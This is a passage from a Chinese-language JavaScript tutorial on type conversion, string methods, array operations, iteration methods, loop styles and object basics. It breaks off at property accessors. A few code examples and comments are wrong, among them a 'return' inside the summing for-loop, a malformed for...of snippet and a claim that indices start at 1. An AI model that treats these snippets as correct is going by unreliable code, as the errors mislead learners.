  alert(parseInt("  123"));   //字符串前面的空格会被忽略，结果为：123
  alert(parseInt("12 3"));    //字符串中包含了空格，解析到空格时停止，结果为12
  alert(parseInt("12.345")); //字符串中包含了小数点，解析到小数点时停止，结果为12
  alert(parseInt("xy123"));  //字符串前面包含了非数字字符“x”，无法解析，返回结果为：NaN
  alert(parseInt("123xy4")); //字符串中包含了非数字字符“xy”，解析到“x”时停止，结果为：123
  ```

  从上述示例我们可以看到，`parseInt() 解析浮点数时，小数部分数据会被截掉`，此时需要使用下面将介绍的 parseFloat()，而不能使用 parseInt()。

**3) 使用parseFloat()函数将参数转换为一个浮点数**

使用格式如下：

```
	parseFloat(stringNum)
```

stringNum 参数为需要解析为浮点型的字符串。

parseFloat() 的作用是将首位为数字的字符串转解析成浮点型数。若 stringNum 字符串不是以合法的字符开头，则返回 NaN；解析过程中如果遇到不合法的字符，将马上停止解析，并返回已经解析的值。

parseFloat() 在解析字符串为整数时，遵循以下规则：

- 解析字符串时，会忽略字符串前后的空格；如果字符串前面为`-`，`-`会保留在转换结果中；如果数字前面为`+`，转换后将删掉`+`号；如果字符串前面为小数点`.`转换结果会在小数点前面添加 0；

- 如果字符串前面为除空格、`+`、`-`和`。`以外的特殊符号，字符串将不会被解析，返回结果为 NaN；

- 在字符串中包含了空格、`+`和`-`等特殊符号或非数字的字符时，解析将在遇到这些字符时停止，并返回已解析的结果；

- 在字符串中包含两个以上为小数点时，`解析到第二个小数点时将停止解析，并返回已解析的结果；`

- `如果字符串是空字符串，返回结果为 NaN。`

  转换示例：

  ```
  alert(parseFloat("312.456"));//结果为：312.456
  alert(parseFloat("-3.12"));//字符串前面的“-”将保留，结果为：-3.12
  alert(parseFloat("+3.12"));//字符串前面的“-”将保留，结果为：3.12
  alert(parseFloat(".12"));//在小数点前面添加0，结果为：0.12
  alert(parseFloat("  3.12"));//截掉字符串前面的空格，结果为：3.12
  alert(parseFloat("312.4A56"));//字符串中包含非数字字符A，解析到A时停止，结果为：312.4
  alert(parseFloat("31 2.4A56"));//字符串中包含空格，解析到空格时停止，结果为：31
  alert(parseFloat("31.2.5"));//字符串中包含两个小数点，解析到第二个小数点时停止，结果为：31.2
  alert(parseFloat("a312.456"));//字符串前面为非数字字符a，解析无法进行，结果为：NaN
  ```

**4）Number对象的toFixed()方法把数字转换为字符串，结果的小数点后有指定位数的数字：**

​	toFixed() 方法可把 Number 四舍五入为指定小数位数的数字字符串。

```
     var num = 5.56789;
     var n=num.toFixed(2);
     console.log(n)  //5.57
     console.log(typeof n)  //String
```

​	`注：toFixed()方法会按四舍五入处理最后一位数`

**5）使用String()把任何类型的数字、字母、变量、表达式转换为字符串**

​	转换示例：

```
     var test1 = new Boolean(1);
     var test2 = new Boolean(0);
     var test3 = new Boolean(true);
     var test4 = new Boolean(false);
     var test5 = new Date();
     var test6 = new String("999 888");
     var test7 = 12345;
     document.write(String(test1)+ "<br>");  //true
     document.write(String(test2)+ "<br>");	//false
     document.write(String(test3)+ "<br>");	//true
     document.write(String(test4)+ "<br>");	//false
     document.write(String(test5)+ "<br>");	//Wed Dec 30 2020 16:16:20 GMT+0800 (中国标准时间)
     document.write(String(test6)+ "<br>");	//999 888
     document.write(String(test7)+ "<br>");	//12345
```

##### 字符串

> String 对象用于处理文本（字符串）。
>
> String 对象创建方法： **new String()**。
>

**语法**

```
     var txt = new String("string");
     或者更简单方式：
     var txt = "string";
```

**你可以使用索引位置来访问字符串中的每个字符：**

**你也可以在字符串添加转义字符来使用引号：**

```
     var x = 'It\'s alright';//It's alright
     var y = "He is called \"Johnny\"";//He is called "Johnny"
```

**特殊字符**

在 JavaScript 中，字符串写在单引号或双引号中。

因为这样，以下实例 JavaScript 无法解析：

 "We are the so-called "Vikings" from the north."

字符串 "We are the so-called " 被截断。

如何解决以上的问题呢？可以使用反斜杠 (\) 来转义 "Vikings" 字符串中的双引号，如下:

 "We are the so-called \"Vikings\" from the north."

 反斜杠是一个**转义字符**。 转义字符将特殊字符转换为字符串字符：

转义字符 (\) 可以用于转义撇号，换行，引号，等其他特殊字符。

下表中列举了在字符串中可以使用转义字符转义的特殊字符：

| 代码 | 输出        |
| :--- | :---------- |
| \'   | 单引号      |
| \"   | 双引号      |
| \\   | 反斜杠      |
| \n   | 换行        |
| \r   | 回车        |
| \t   | tab(制表符) |
| \b   | 退格符      |
| \f   | 换页符      |

**String 对象属性**

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210305155252.png" alt="image-20201108094540133" style="zoom:80%;" />

String常用的对象方法

1. **charAt()**	返回在指定位置的字符

   返回字符串中的第三个字符:

   ```
   var str = "HELLO WORLD";
   var n = str.charAt(2)
   ```

   *n*输出结果:

   L

2. **concat()**   返回两个或更多字符串，并返回新的字符串

   连接两个字符串:

   ```
   var str1 = "Hello ";
   var str2 = "world!";
   var n = str1.concat(str2);
   ```

   *n* 输出结果:

   Hello world!

   更多用法请前往：https://www.runoob.com/jsref/jsref-concat-string.html

3. **repeat()**   复制字符串指定次数，并将它们连接在一起返回。

4. 复制字符串 "Runoob" 两次:

   ```
   var str = "Runoob"; 
   str.repeat(2);
   ```

   *n* 输出结果:

   RunoobRunoob

5. includes()  查找字符串中是否包含指定的子字符串。

   查找字符串是否包含 "Runoob":

   ```
   var str = "Hello world, welcome to the Runoob。";
   
    var n = str.includes("world");
   ```

   *n* 输出结果:

   true

   includes() 方法用于判断字符串是否包含指定的子字符串。

   如果找到匹配的字符串则返回 true，否则返回 false。

   **注意：** `includes() 方法区分大小写。`

   更多用法请前往：https://www.runoob.com/jsref/jsref-string-includes.html

6. **spilt()**       把字符串分割为字符串数组

   ```
   var str="How are you doing today?";
   var n=str.split(" ");
   console.log(n)//["How", "are", "you", "doing", "today?"]
   ```

   更多用法请前往：https://www.runoob.com/jsref/jsref-split.html

7. **substr()**    从起始索引号提取字符串中指定数目的字符。

   抽取指定数目的字符：

   ```
   var str="Hello world!";
   var n=str.substr(2,3)
   ```

   *n* 输出结果:

   llo

   **语法**

   *string*.substr(*start*,*length*)

   **参数值**

   | 参数     | 描述                                                         |
   | :------- | :----------------------------------------------------------- |
   | *start*  | 必需。要抽取的子串的起始下标。必须是数值。如果是负数，那么该参数声明从字符串的尾部开始算起的位置。也就是说，-1 指字符串中最后一个字符，-2 指倒数第二个字符，以此类推。 |
   | *length* | 可选。子串中的字符数。必须是数值。如果省略了该参数，那么返回从 stringObject 的开始位置到结尾的字串。 |

8. **trim()**       去除字符串两边的空白

   去除字符串的头尾空格:

   var str = "       Runoob        "; alert(str.trim());

   输出结果:

   Runoob

9. **toString()**  返回一个字符串。

   返回一个 String 对象的值:

   var str = "Runoob"; var res = str.toString();

   *res* 输出结果:

   Runoob

10.**slice()** 提取某个字符串的一部分，并返回一个新的字符串，且不会改动原字符串

​	语法：str.slice(beginIndex[, endIndex])

​			beginIndex:从该索引（以 0 为基数）处开始提取原字符串中的字符。如果值为负数，会被当做 `strLength + beginIndex` 看待，这里的`strLength` 是字符串的长度（例如， 如果 `beginIndex` 是 -3 						则看作是：`strLength - 3`）

​			endIndex:可选。在该索引（以 0 为基数）处结束提取字符串。如果省略该参数，`slice()` 会一直提取到字符串末尾。如果该参数为负数，则被看作是 strLength + endIndex，这里的 strLength 就是字						符串的长度(例如，如果 endIndex 是 -3，则是, strLength- 3)。

​			返回值：返回一个从原字符串中提取出来的新字符串

```
     const str = 'The quick brown fox jumps over the lazy dog.';

     console.log(str.slice(31));
     // expected output: "the lazy dog."

     console.log(str.slice(4, 19));
     // expected output: "quick brown fox"

     console.log(str.slice(-4));
     // expected output: "dog."

     console.log(str.slice(-9, -5));
     // expected output: "lazy"
```

##### 数组

###### 数组的基本使用

**为什么使用数组?**

- 假如有这样一个需求：保存自己多个朋友的名字。可以这么做：

  ```javascript
  // 保存班级中所有学生的名字
  var name1 = "Tom"
  var name2 = "Lily"
  var name3 = "Lucy"
  var name4 = "Lilei"
  var name5 = "Coderwhy"
  ```

- 这不是一个好的解决方案

  - 因为假如班级有100个学生, 那么我们就需要有100个变量.
  - 100个变量的是非常不方便管理的, 而且当我们需要找到某一个学生时, 从100个变量中去搜索也是一个问题.

- 很明显, 这种情况下, 我们通常会使用数组来解决:

  ```javascript
  // 使用数组来保存学生名字
  var names = ["Tom", "Lily", "Lucy", "Lilei", "Coderwhy"]
  ```

**创建和初始化数组**

- 用JavaScript声明、创建和初始化数组很简单，就像下面这样：

  ```javascript
  // 创建和初始化数组
  var daysOfWeek = new Array()
  var daysOfWeek = new Array(7)
  var daysOfWeek = new Array('Sunday', 'Monday', 'Tuesday', 'Wednesday',
      'Thursday', 'Friday', 'Saturday')
  ```

- 代码解析:

  - 使用`new`关键字，就能简单地声明并初始化一个数组
  - 用这种方式，还可以创建一个指定长度的数组.
  - 另外，也可以直接将数组元素作为参数传递给它的构造器
  - 用`new`创建数组并不是最好的方式。如果你想在JavaScript中创建一个数组，只用中括号（`[]`）的形式就行了

- 使用中括号（`[]`）创建数组

  ```javascript
  var daysOfWeek = ['Sunday', 'Monday', 'Tuesday', 'Wednesday',
      'Thursday', 'Friday', 'Saturday'];
  ```

**数组长度和遍历数组**

- 如果我们希望获取数组的长度, 有一个length属性

  ```javascript
  // 获取数组的长度
  alert(daysOfWeek.length)
  ```

- 也可以通过下标值来遍历数组:

  ```javascript
  // 普通for方式遍历数组
  for (var i = 0; i < daysOfWeek.length; i++) {
      alert(daysOfWeek[i])
  }
  
  // 通过foreach遍历数组
  daysOfWeek.forEach(function (value) {
      alert(value)
  })
  ```

###### 数组的常见操作

> 数组中常见的操作有: 添加元素、删除元素、修改元素、获取元素.

**添加元素**

- JavaScript中, 进行我们上述的操作都比较简单: 因为语言本身都已经封装好了这些特性.

- 假如我们有一个数组: numbers, 初始化0~9

  ```javascript
  // 初始化一个数组
  var numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
  ```

- 添加一个元素到数组的最后位置:

  ```javascript
  // 添加一个元素到数组的最后位置
  // 方式一:
  numbers[numbers.length] = 10
  
  // 方式二:
  numbers.push(11)
  numbers.push(12, 13)
  alert(numbers)
  ```
  
- 在数组首位插入一个元素:

  ```javascript
  // 在数组首位插入一个元素
  for (var i = numbers.length; i > 0; i--) {
      numbers[i] = numbers[i-1]
  }
  numbers[0] = -1
  alert(numbers) // -1,0,1,2,3,4,5,6,7,8,9,10,11,12,13
  ```

- 上面代码实现的原理是怎样的呢?

  <img src="https:////upload-images.jianshu.io/upload_images/1102036-8fb6621c6dca7e05?imageMogr2/auto-orient/strip|imageView2/2/w/1024/format/webp" alt="img" style="zoom:80%;" />

- 考虑上面代码实现的性能怎么呢?

  - 性能并不算非常高
  - 这也是数组和链表(后面我们会学习到)相对比的一个劣势: 在中间位置插入元素的效率比链表低.

- 当然, 我们在数组首位插入数据可以直接使用unshift方法，unshift也是基于上面的原理实现的

  ```javascript
  // 通过unshift在首位插入数据
  numbers.unshift(-2)
  numbers.unshift(-4, -3)
  alert(numbers) // -4,-3,-2,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13
  ```

**删除元素**

- 如果希望删除数组最后的元素, 可以使用pop()方法

  ```javascript
  // 删除最后的元素
  numbers.pop()
  alert(numbers) // -4,-3,-2,-1,0,1,2,3,4,5,6,7,8,9,10,11,12
  ```

- 如果我们希望移除的首位元素, 自己实现代码:

  ```javascript
  // 删除首位的元素
  let numbers = [1, 2, 3]
       let arr = []
      for (var i = 1; i < numbers.length; i++) {
       
  
        arr[i - 1] = numbers[i]
        console.log(numbers[i]);
        
      }
      console.log(arr); //[2,3]
  ```

- 当然, 我们可以直接使用shift方法来实现:

  ```javascript
  numbers.shift()
  alert(numbers)
  ```

**任意位置**

- 任意位置?

  - 前面我们学习的主要是在数组的开头和结尾处添加和删除数据.
  - 那如果我们希望在数组的中间位置进行一些操作应该怎么办呢?

- 一方面, 我们可以自己封装这样的函数, 但JS已经给我们提供了一个splice方法

- 通过splice删除数据

  参数：

  ​	 *start*

  ​		指定修改的开始位置（从0计数）。如果超出了数组的长度，则从数组末尾开始添加内容；如果是负值，则表示从数组末位开始的第几位（从-1计数，这意味着-n是倒数第n个元素并且等价于				   		`array.length-n`）；如果负数的绝对值大于数组的长度，则表示开始位置为第0位。

  ​	*deleteCount* 可选

  ​		整数，表示要移除的数组元素的个数。

  ​		如果 `deleteCount` 大于 `start` 之后的元素的总数，则从 `start` 后面的元素都将被删除（含第 `start` 位）。

  ​		如果 `deleteCount` 被省略了，或者它的值大于等于`array.length - start`(也就是说，如果它大于或者等于`start`之后的所有元素的数量)，那么`start`之后数组的所有元素都会被删除。

  ​		如果 `deleteCount` 是 0 或者负数，则不移除元素。这种情况下，至少应添加一个新元素。

  ​	*item1, item2, ...* 可选

  ​		要添加进数组的元素,从`start` 位置开始。如果不指定，则 `splice()` 将只删除数组元素。

  返回值：

  **`splice()`** 方法通过删除或替换现有元素或者原地添加新的元素来修改数组,并以数组形式返回被修改的内容。此方法会改变原数组。

  如果是删除元素，由被删除的元素组成的一个数组。如果只删除了一个元素，则返回只包含一个元素的数组。如果没有删除元素，则返回空数组。

  ```javascript
  // 删除指定位置的几个元素
   let numbers = [1,2,3,4]
   let a = numbers.splice(1, 2,1)
   console.log(numbers); //[1,4,1]
  console.log(a);       //[2,3]
  ```

- 代码解析:

  - 上面的代码会删除索引为1, 2位置的元素.
  - 第一个参数表示索引起始的位置为1(其实是第2个元素, 因为索引从1开始的), 删除2个元素.

- 如果我们希望使用splice来插入数据呢?

  ```javascript
  // 插入指定位置元素
  numbers.splice(5, 0, 3, 2, 1)
  alert(numbers) // -4,-3,-2,-1,0,3,2,1,4,5,6,7,8,9,10,11,12,13
  ```

- 代码解析:

  - 上面的代码会从索引为5的位置开始插入数据. 其他数据依次向后位移.
  - 第一个参数依然是索引值为5(第六个位置)
  - 第二个参数为0时表示不是删除数据, 而是插入数据.
  - 后面紧跟的是在这个位置要插入的数据, 可以是其他类型, 比如"a", "b", "c".

- 如果我们希望使用splice来修改数据呢?

  ```javascript
  // 修改指定位置的元素
  numbers.splice(5, 3, "a", "b", "c")
  alert(numbers) // -4,-3,-2,-1,0,a,b,c,4,5,6,7,8,9,10,11,12,13
  ```

- 代码解析:

  - 上面的代码会从索引5的位置开始修改数据, 修改多少个呢? 第二个参数来决定的.
  - 第一个参数依然是索引的位置为5(第六个位置)
  - 第二个参数是要将数组中多少个元素给替换掉, 我们这里是3个(也可以使用3个元素来替换2个, 可以自己尝试一下)
  - 后面跟着的就是要替换的元素.

###### 数组的其他操作

> 上面学习的是对数组的一些基本操作.
>
> JavaScript中添加了很多方便操作数据的方法, 我们一些来简单回顾一下.

**常见方法**

- 我们先对常见的方法简单来看一下

  | 方法名        | 方法描述                                                     |
  | ------------- | ------------------------------------------------------------ |
  | `concat`      | 连接2个或更多数组，并返回结果                                |
  | `every`       | 对数组中的每一项运行给定函数，如果该函数对每一项都返回 `true`，则返回`true`, 否则返回`false` |
  | `filter`      | 对数组中的每一项运行给定函数，返回该函数会返回 `true`的项组成的数组 |
  | `forEach`     | 对数组中的每一项运行给定函数。这个方法没有返回值             |
  | `join`        | 将所有的数组元素连接成一个字符串                             |
  | `indexOf`     | 返回第一个与给定参数相等的数组元素的索引，没有找到则返回-1   |
  | `lastIndexOf` | 返回在数组中搜索到的与给定参数相等的元素的索引里最大的值     |
  | `map`         | 对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组 |
  | `reverse`     | 颠倒数组中元素的顺序，原先第一个元素现在变成最后一个，同样原先的最后一个元素变成了现在的第一个 |
  | `slice`       | 传入索引值，将数组里对应索引范围内的元素作为新数组返回       |
  | `some`        | 对数组中的每一项运行给定函数，如果任一项返回 `true`，则结果为`true`, 并且迭代结束 |
  | `sort`        | 按照字母顺序对数组排序，支持传入指定排序方法的函数作为参数   |
  | `toString`    | 将数组作为字符串返回                                         |
  | `valueOf`     | 和 `toString`类似，将数组作为字符串返回                      |

**数组合并**

- 数组的合并非常简单, 使用concat即可

  ```javascript
  // 数组的合并
  var nums1 = [1, 2, 3]
  var nums2 = [100, 200, 300]
  var newNums = nums1.concat(nums2)
  console.log(newNums) // 1,2,3,100,200,300
  ```

**迭代方法**

- 为了方便操作数组, JS提供了很多迭代器方法, 我们来回顾一下

- **every()方法**

  MDN文档：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/every

  - `callback`

    用来测试每个元素的函数，它可以接收三个参数：`element`用于测试的当前值。`index`可选用于测试的当前值的索引。`array`可选调用 `every` 的当前数组。

  - `thisArg`

    执行 `callback` 时使用的 `this` 值。

  [返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/every#返回值)

  如果回调函数的每一次返回都为 boolean值，返回 `**true**` ，否则返回 `**false**`。

  - every()方法是将数组中每一个元素传入到一个函数中, 该函数返回true/false.
  - 如果函数中每一个元素都返回true, 那么结果为true, 有一个为false, 那么结果为false

- every()练习:

  - 判断一组元素中是否都包含某一个字符

  ```javascript
  const isBelowThreshold = (currentValue) => currentValue < 40;
  const array1 = [1, 30, 39, 29, 10, 13];
  console.log(array1.every(isBelowThreshold));   //true
  ```

- **some()方法**

  MDN文档：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/some

  - some()方法是将数组中每一个元素传入到一个函数中, 该函数返回true/false
  - 但是和every不同的是, 一旦有一次函数返回了true, 那么迭代就会结束. 并且结果为true

- some()练习

  ```javascript
  const isBelowThreshold = (currentValue) => currentValue < 30;
  const array1 = [1, 30, 39, 29, 10, 13];
  console.log(array1.some(isBelowThreshold));   //true
  ```

- **forEach()方法**

  - forEach()方法仅仅是一种快速迭代数组的方式而已.
  - 该方法不需要返回值

- forEach的使用

  ```javascript
  // 定义数组
  var names = ["abc", "cb", "mba", "dna"]
  // forEach的使用
  names.forEach(function (t) {
      console.log(t)
  })
  ```

- **filter()方法**

  [语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/filter#语法)

  ```
  var newArray = arr.filter(callback(element[, index[, array]])[, thisArg])
  ```

  [参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/filter#参数)

  - `callback`

    用来测试数组的每个元素的函数。返回 `true` 表示该元素通过测试，保留该元素，`false` 则不保留。它接受以下三个参数：

    `element`数组中当前正在处理的元素。`index`可选正在处理的元素在数组中的索引。`array`可选调用了 `filter` 的数组本身。

  - `thisArg`可选

    执行 `callback` 时，用于 `this` 的值。

  [返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/filter#返回值)

  一个新的、由通过测试的元素组成的数组，如果没有任何数组元素通过测试，则返回空数组。

  filter() 方法创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素。

  **注意：** filter() 不会对空数组进行检测。

  **注意：** filter() 不会改变原始数组。

  实例：

  ```
  var args = [32, 33, 16, 40];
  let a = args.filter(item => {
  return item >= 18
  })  
  console.log(a);    //[32,33,40]
  console.log(args); //[32, 33, 16, 40] 
  ```

- **sort（）方法**

  MDN文档：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/sort

  sort()方法在适当的位置对数组进行排序，并且返回数组。

  实例：

  ```
        var arr=[1,3,10,4,2,5];
        function compare(value1,value2) {
              console.log(value1,value2,arr);
              if(value1<value2){return -1;}
              else if(value1>value2){return 1;}
              else {return 0}
          }
          arr.sort(compare);
          alert(arr);   //1,2,3,4,5,10
  ```

  我们定义的数组是这样的 arr=[1,3,10,4,2,5]
  第一行：传入的是value1=1，value2=3，比较大小返回-1，数组的位置不变。
  第二行：传入的是value1=3，value2=10，比较大小返回-1，数组的位置不变。
  第三行：传入的是value1=10，value2=4，比较大小返回1，两项交换位置，现在的数组是arr=[1,3,4,10,2,5]
  第四行：现在不是继续往后面比较，由于返回值为1（这是升序，1的时候往前面比较），则在第三行操作交换位置后，这传入的参数是value1=3，value2=4，比较大小，返回-1，位置不变，数组还是arr=[1,3,4,10,2,5]
  第五行：这才继续向后比较，传入value1=10，value2=2，比较大小，返回1，交换位置，数组为arr=[1,3,4,2,10,5]
  第六行：前面的返回值又是1，则又比较前面的，value1=4，value2=2，比较大小，返回1，数组变为arr=[1,3,2,4,10,5]
  第七行：第六行结果返回值是1，所以这个地方也不能往后面比较，value1=3，value2=2；比较大小，返回1，数组为arr=[1,2,3,4,10,5]
  第八行：同理，value1=1，value2=2，比较大小返回-1，数组不变。
  第九行：继续往后面比较，value1=10，value2=5，比较大小，返回1，改变位置，数组是arr=[1,2,3,4,5,10]
  最后一行：前面返回值是1，则向前比较，value1=4，value2=5，比较大小，返回-1，数组不变，（因为前面4前面的数是排好序的，只要5>4，就会比前面都大，则前面不用比较。）

  如果想升序排行的话，可以使用：

  ```
     var arr=[1,3,10,4,2,5];
          arr.sort((a,b)=>{
          	return a-b
          });
  ```

  降序则：

  ```
     
     var arr=[1,3,10,4,2,5];
          arr.sort((a,b)=>{
          	return b-a
          });
  ```

  `而且这个函数是直接改变原数组的排列，而不是返回一个新数组`

- **map()方法**

  MDN文档：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map

  map() 方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值。

  map() 方法按照原始数组元素顺序依次处理元素。

  `**注意：** map() 不会对空数组进行检测。`

  `**注意：** map() 不会改变原始数组。`

  使用实例：

  ```
  var numbers = [4, 9, 16, 25];
  var result=numbers.map(Math.sqrt);//2,3,4,5
  ```

  ```
  语法：array.map(function(currentValue,index,arr))
  ```

  使用实例：

  ```
  var arr=[1,2,3]
  var result =arr.map((item)=>{
  	return item*2
  })
  console.log(result)//2，4，6
  ```

  map的作用是用来筛选和处理数组的

- **reduce方法**

MDN文档：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/reduce

我们单独拿出reduce方法, 因为这个方法相对来说难理解一点

首先, 我们来看这个方法需要的参数:

```javascript
arr.reduce(callback[, initialValue])
```

参数

- callback（一个在数组中每一项上调用的函数，接受四个函数：）
  - previousValue（上一次调用回调函数时的返回值，或者初始值）
  - currentValue（当前正在处理的数组元素）
  - currentIndex（当前正在处理的数组元素下标）
  - array（调用reduce()方法的数组）
- initialValue（可选的初始值。作为第一次调用回调函数时传给previousValue的值）

有些晦涩难懂, 我们直接看例子

- 求一个数字中数字的累加和

使用for实现:

```javascript
// 1.定义数组
var numbers = [1, 2, 3, 4]

// 2.for实现累加
var total = 0
for (var i = 0; i < numbers.length; i++) {
    total += numbers[i]
    return total
}
alert(total) // 10
```

使用forEach简化for循环

- 相对于for循环, forEach更符合我们的思维(遍历数组中的元素)

```javascript
// 3.使用forEach
var total = 0
numbers.forEach(function (t) {
    total += t
})
alert(total)
```

使用reduce方法实现

```javascript
// 4.使用reduce方法
var total = numbers.reduce(function (pre, cur) {
    return pre + cur
})
alert(total)
```

代码解析:

- pre中每次传入的参数是不固定的, 而是上次执行函数时的结果保存在了pre中
- 第一次执行时, pre为0, cur为1
- 第二次执行时, pre为1 (0+1, 上次函数执行的结果), cur为2
- 第三次执行时, pre为3 (1+2, 上次函数执行的结果), cur为3
- 第四次执行时, pre为6 (3+3, 上次函数执行的结果), cur为4
- 当cur为4时, 数组中的元素遍历完了, 就直接将第四次的结果, 作为reduce函数的返回值进行返回.

似乎和forEach比较没有太大的优势呢?

- 通过这个代码你会发现, 你不需要在调用函数前先定义一个变量, 只需要一个变量来接收方法最终的参数即可.
- 但是这就是优势吗? 不是, 优势在于reduce方法有返回值, 而forEach没有.
- 这算什么优势? 如果reduce方法有返回值, 那么reduce方法本身就可以作为参数直接传递给另外一个需要reduce返回值的作为参数的函数. 而forEach中你只能先将每次函数的结果保存在一个变量, 最后再将变量传入到参数中.
- 没错, 这就是最近非常流行的函数式编程. 也是为了几乎每个可以使用函数式编程的语言都有reduce这个方法的原因.
- 关于函数式编程, 不再本次课程的讨论之中, 只是看到了这个函数, 给大家延伸了一下而已.(后面有机会和大家分享函数式编程)

initialValue还需要讲吗?

- 其实就是第一次执行reduce中的函数时, pre的值.
- 因为默认pre第一次执行时为0.

###### **JS数组遍历**

> 基本就是for,forin,foreach,forof,map等等一些方法

**第一种:普通for循环**

代码如下:

```
for(j = 0; j < arr.length; j++) {
} 
```

简要说明: 最简单的一种，也是使用频率最高的一种，虽然性能不弱，但仍有优化空间

**第二种:优化版for循环**

代码如下:****

```
for(j = 0,len=arr.length; j < len; j++) {
}
```

简要说明: 使用临时变量，将长度缓存起来，避免重复获取数组长度，当数组较大时优化效果才会比较明显。

**这种方法基本上是所有循环遍历方法中性能最高的一种**

**第三种:foreach循环**(没有返回值，可以直接更改item参数，这样同时也会修改数组元素的，是属于副本，而不是复制)

代码如下:

```
arr.forEach(function(e){  
});
```

简要说明: 数组自带的foreach循环，使用频率较高，实际上性能比普通for循环弱

**第四种:forin循环**

代码如下:

```
Array.prototype.foo = function(){
	console.log('foo')
}
for(let index in arr) {
	console.log(index, arr[index]) //
}
```

![image-20210815024151801](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210815024152.png)

简要说明: 这个循环很多人爱用，但实际上，经分析测试，在众多的循环遍历方式中

`它的效率是最低的`,并且该循环还会把自定义挂载在原型上的属性遍历出来

**第五种:map遍历**(返回新的数组)

代码如下:

```
arr.map(function(n){  
});
```

简要说明: 这种方式也是用的比较广泛的，虽然用起来比较优雅，但实际效率还比不上foreach

**第六种:forof遍历(需要ES6支持)**

代码如下:

```
for(let value of arr) {  
});
```

简要说明: 这种方式是es6里面用到的，性能要好于forin，但仍然比不上普通for循环

##### 对象

1. 内建对象

   - 由ES标准中定义的对象，在任何的ES的实现中都可以实现

   - 比如：Math String Number Boolean Function Object....

2. 宿主对象

   - 由JS的运行环境提供的对象，目前来讲主要指由浏览器提供的对象

   - 比如 BOM DOM

     例：console.log()——BOM、document.write()——DOM

3.  自定义对象

   - 由开发人员自己创建的对象

###### 基本使用

**创建对象**

​	使用new 关键字调用构造函数constructor，构造函数是专门用来创建对象的函数，使用typeof检查一个对象时，会返回object

**方式一：**

```
	var obj = new Object()
	//在对象中保存的值称为属性
	//向对象添加属性
		//语法: 对象.属性名 = 属性值；
	obj.name = "孙悟空"
	console.log(obj) //{name: '孙悟空'}
	//删除对象的属性
		//语法： delete 对象.属性名
	delete obj.name
	console.log(obj) //{}
```

如果要使用特殊的属性名，不能采用.的方式来操作

​	需要使用另一种方式：

​			`语法：对象["属性名"] = 属性值`

obj["123"] = 'hello'

使用[ ]这种方式去操作属性，更加的灵活，

​	在[ ]中可以直接传递一个变量，这样变量值是多少就会读取多少

​			`语法：对象[变量] = 属性值`

**方式二**（推荐使用）

> ​	使用对象字面量，可以在创建对象时，直接指定对象中的属性

```
	var obj = {
			name: "猪八戒",
			age: 28,
			weight: '200kg',
			sonObj: {
				name: 'son'
			}
		}
```

**我们的实例对象是使用运算符new 类名构建出来的，现在我们自己实现new运算符的功能**

```
    function father(name) {
      this.name = name;
      this.sayname = function () {
        console.log(this.name)
      }
    }
    function myNew(ctx, ...args) { // ...args为ES6展开符,也可以使用arguments
      //先用Object创建一个空的对象
      let obj = new Object();
      console.log(obj);    //{}
      //新对象会被执行prototype连接
      obj.__proto__ = ctx.prototype;
      console.log(obj);    //father{}
      //新对象和函数调用的this绑定起来
      let res = ctx.call(obj, ...args);
      //判断函数返回值如果是null或者undefined则返回obj,否则就放回res,如果构造函数返回的是一个对象，那么实例就是它
      return res instanceof Object ? res : obj;
    }

    var son = myNew(father, 'kimi')
    var son2 = new father('kimi2')
    console.log(son);      //father {name: "kimi", sayname: ƒ}
    console.log(son2);     //father {name: "kimi2", sayname: ƒ}
```

######  对象遍历

1.for … in 循环遍历对象自身的和继承的可枚举属性(循环遍历对象自身的和继承的可枚举属性(不含Symbol属性).).

![img](https://img2018.cnblogs.com/blog/1543474/201908/1543474-20190819160618071-1699607505.png)

2、使用Object.keys()遍历 (返回一个数组,包括对象自身的(不含继承的)所有可枚举属性(不含Symbol属性).).

![img](https://img2018.cnblogs.com/blog/1543474/201908/1543474-20190819160801372-293238672.png)

 

<img src="https://img2018.cnblogs.com/blog/1543474/201908/1543474-20190819161346978-1979945848.png" alt="img" style="zoom: 67%;" />

ES6允许对象的属性直接写变量，这时候属性名是变量名，属性值是变量值。

```
     const age = 12;
     const name = "Amy";
     const person = {age, name};
     person   //{age: 12, name: "Amy"}
     //等同于
     const person = {age: age, name: name}
```

方法名也可以简写

```
     const person = {
       sayHi(){
         console.log("Hi");
       }
     }
     person.sayHi();  //"Hi"
     //等同于
     const person = {
       sayHi:function(){
         console.log("Hi");
       }
     }
     person.sayHi();//"Hi"
```

ES6允许用表达式作为属性名(只可以在对象中这样用），`但是一定要将表达式放在方括号内`。

```
     const obj = {
      ["he"+"llo"](){
        return "Hi";
       }
     }
     obj.hello();  //"Hi"
```

`注意点：属性的简洁表示法和属性名表达式不能同时使用，否则会报错。`

```
     const hello = "Hello";
     const obj = {
      [hello]
     };
     obj  //SyntaxError: Unexpected token }

     const hello = "Hello";
     const obj = {
      [hello+"2"]:"world"
     };
     obj  //{Hello2: "world"}
```

###### Date对象

> Date 对象用于处理日期与时间。
>
> 创建 Date 对象： **new Date()**
>
> 以下四种方法同样可以创建 Date 对象：

```
     var d = new Date();
     var d = new Date(milliseconds);
     var d = new Date(dateString);
     var d = new Date(year, month, day, hours, minutes, seconds, milliseconds);
```

没什么技术性的问题，详情请前往https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Date

###### 对象访问属性

> 对象中有get和set方法，在读取和设定值的时候触发。vue中的数据绑定就是通过这个来实现的

**1. 直接在对象内使用**

